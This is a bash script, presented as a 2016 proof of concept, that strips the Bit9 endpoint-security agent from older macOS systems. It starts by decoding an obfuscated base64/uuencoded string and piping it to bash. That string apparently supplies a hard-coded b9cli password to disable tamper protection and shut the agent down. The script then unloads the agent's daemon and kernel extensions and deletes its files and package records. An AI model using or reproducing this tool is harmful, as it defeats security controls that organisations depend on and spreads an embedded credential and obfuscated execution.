#!/usr/bin/env bash
#title          :Nuke Bit9 agent from existance
#description    :This is an old scrip deveploed in 2016. Use at your own risk.
#                This script will remove Bit8 agent from any OSX machine before
#                El Capitan. Requires root and it's considered a PoC
#file_nam       :Bit9Nuke.sh.sh
#author         :Adrian Puente
#date           :20160315
#version        :1.8
#bash_version   :4.4.19
#==================================================================

B9Override="begin-base64 644 decodeme%L0FwcGxpY2F0aW9ucy9CaXQ5L1Rvb2xzL2I5Y2xpICAtLXBhc3N3b3JkICc/LnRWPkN1Olk5Uk1D%ZHJtIlw2fScgCi9BcHBsaWNhdGlvbnMvQml0OS9Ub29scy9iOWNsaSAgLS10YW1wZXJwcm90ZWN0%IDAKL0FwcGxpY2F0aW9ucy9CaXQ5L1Rvb2xzL2I5Y2xpICAtLXNodXRkb3duCgo=%====%"

echo "Overriding Bit9 tamper protection"
echo ${B9Override} | tr '%' '\n' | uudecode -p | bash
echo ${B9Override} | tr '%' '\n' | uudecode -p | bash

# Calculate variables dependent upon 10.9 or later
export B9OSXVER=`sw_vers -productVersion`
B9EXTDIR="/System/Library/Extensions"
B9KERNELPKG="com.bit9.Bit9Kernel.pkg"

declare -a B9TARGETOS_ARR=("10.9" "10.10" "10.11")
for B9TARGETOS in "${B9TARGETOS_ARR[@]}"
do
    if [[ "$B9OSXVER" == "$B9TARGETOS"* ]]; then
        B9EXTDIR="/Library/Extensions"
        B9KERNELPKG="com.bit9.Bit9Kernel2.pkg"
        B9CHECKOTHER="/System/Library/Extensions"
    fi
done


# Tell the Daemon we're about to uninstall (this generates an event to the
# server) and sleep to give it a chance to send
echo "Sending uninstall event"
/Applications/Bit9/Tools/b9cli -agentuninstall >/dev/null

echo ""
echo "Stopping Bit9 Daemon..."
sudo launchctl unload /Library/LaunchDaemons/com.bit9.Daemon.plist
echo ""
echo "   Daemon stopped."

echo ""
echo "Stopping Bit9 Notifier..."
# Unregister the launch agent using a technique to invoke launchctl on
# the all current user sessions.  This is necessary because $SUDO_USER isn't
# available in a postinstall script.
# $F[0] is the pid
# $F[1] is the username
# $F[2] is the first word of the command
ps -ww -A -opid,user,command | \
perl -nae 'if($F[2] =~ /\bloginwindow\b/) { system(
qq(launchctl bsexec $F[0] su $F[1] -c "launchctl unload -w /Library/LaunchAgents/com.bit9.Notifier.plist"))
}'
echo ""
echo "   Notifier stopped."

# Wait for the daemon to stop before proceeding.
b9pid=$(ps -axf | grep b9daemon | grep -v grep | awk '{print $2}')

startTime=$(date +%s)

while ps -p $b9pid &> /dev/null; do
    sleep 1
    curTime=$(($(date +%s)-startTime))

    ## give up after 5 minutes
    if (test $curTime -gt 300) ; then
        echo "Daemon did not shutdown properly. Uninstall will not proceed"
        exit 1
    fi
done;

# A function that waits for a kext to unload. If the kext is not loaded,
# this function will return succesfully immediatly.  If the kext does not
# unload in 5 minutes, the script will exit with an error status.
function waitForKext {
    startTime=$(date +%s)

    echo "Waiting for KEXT $1 to shutdown..."
    while kextstat | grep "$1" &> /dev/null; do
        sleep 1
        curTime=$(($(date +%s)-startTime))

        ## give up after 5 minutes
        if (test $curTime -gt 300) ; then
            echo "KEXT $1 did not shutdown properly. Installation will not proceed"
            exit 1
        fi
    done;

    echo "KEXT $1 is shutdown."
}


echo ""
echo "Stopping the Bit9 Kernel Extension..."
if (test -d "$B9EXTDIR/b9kernel.kext"); then
    sudo kextunload $B9EXTDIR/b9kernel.kext &> /dev/null
    waitForKext "com.bit9.Kernel "
    sudo kextunload $B9EXTDIR/b9kernel.kext/Contents/Plugins/b9kernelkauth.kext &> /dev/null
    waitForKext "com.bit9.KernelKauth"
    sudo kextunload $B9EXTDIR/b9kernel.kext/Contents/Plugins/b9kernelsupport.kext &> /dev/null
    waitForKext "com.bit9.KernelSupport"
    sudo rm -fR $B9EXTDIR/b9kernel.kext
fi
if (test -n "$B9CHECKOTHER"); then
    if (test -d "$B9CHECKOTHER/b9kernel.kext"); then
        sudo kextunload $B9CHECKOTHER/b9kernel.kext &> /dev/null
        waitForKext "com.bit9.Kernel "
        sudo kextunload $B9CHECKOTHER/b9kernel.kext/Contents/Plugins/b9kernelkauth.kext &> /dev/null
        waitForKext "com.bit9.KernelKauth"
        sudo kextunload $B9CHECKOTHER/b9kernel.kext/Contents/Plugins/b9kernelsupport.kext &> /dev/null
        waitForKext "com.bit9.KernelSupport"
        sudo rm -fR $B9CHECKOTHER/b9kernel.kext
    fi
fi

echo ""
echo "   Driver stopped."

echo ""
echo "Removing Bit9 files..."
sudo rm /Library/LaunchDaemons/com.bit9.Daemon.plist
sudo rm /Library/LaunchAgents/com.bit9.Notifier.plist
sudo rm -fR /Applications/Bit9
if !(test "$1" = "d") && !(test "$1" == "-d"); then
sudo rm -fR "/Library/Application Support/com.bit9.Agent"
fi

echo ""
echo "   Bit9 files removed."

echo ""
echo "Removing Bit9 Installer Packages..."
sudo pkgutil --forget com.bit9.Bit9Agent.pkg
sudo pkgutil --forget $B9KERNELPKG
sudo pkgutil --forget com.bit9.Bit9Daemon.pkg
sudo pkgutil --forget com.bit9.Bit9Notifier.pkg
echo ""
echo "   Bit9 Installer Packages removed."
echo ""
